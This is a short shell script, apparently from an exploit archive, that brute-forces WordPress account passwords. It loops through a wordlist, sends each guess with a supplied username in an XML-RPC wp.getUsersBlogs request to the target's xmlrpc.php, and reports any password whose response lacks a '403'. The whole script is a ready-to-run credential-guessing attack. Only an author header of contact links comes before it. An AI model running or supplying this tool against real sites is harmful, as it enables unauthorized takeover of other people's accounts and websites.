#!/bin/sh
#####################
# 
# 
# Scripted By :  Claudio Viviani 
#                http://www.homelab.it 
#                http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) 
#                http://ffhd.homelab.it (Free Fuzzy Hashes Database) 
#                 
#                info@homelab.it 
#                homelabit@protonmail.ch 
# 
#                https://www.facebook.com/homelabit 
#                https://twitter.com/homelabit 
#                https://plus.google.com/+HomelabIt1/ 
#                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww 
# 
#####################

url=$1

user=$2

wordlist=$3

if [ -z "$wordlist" ]; then

 echo "Usage: $0 http://TARGT username wordlist.txt"
 exit 1

elif [ ! -f "$wordlist" ]; then

 echo "Can't open $wordlist file"
 exit 1
fi

for password in $(cat $wordlist); do

cat << EOF > /tmp/brutexmlpayload.txt
<?xml version="1.0" encoding="iso-8859-1"?>
 <methodCall>
 <methodName>wp.getUsersBlogs</methodName>
 <params>
 <param><value>$user</value></param>
 <param><value>$password</value></param>
 </params>
 </methodCall>
EOF

 body=$(curl --data @/tmp/brutexmlpayload.txt $url/xmlrpc.php >/tmp/brutexmlbody.txt 2>/dev/null)
 
 if ! grep "403" /tmp/brutexmlbody.txt > /dev/null; then

 echo "PASSWORD FOUND: $password"
 
 fi

 # pause time
 sleep 1

done

rm -f /tmp/brutexmlpayload.txt /tmp/brutexmlbody.txt
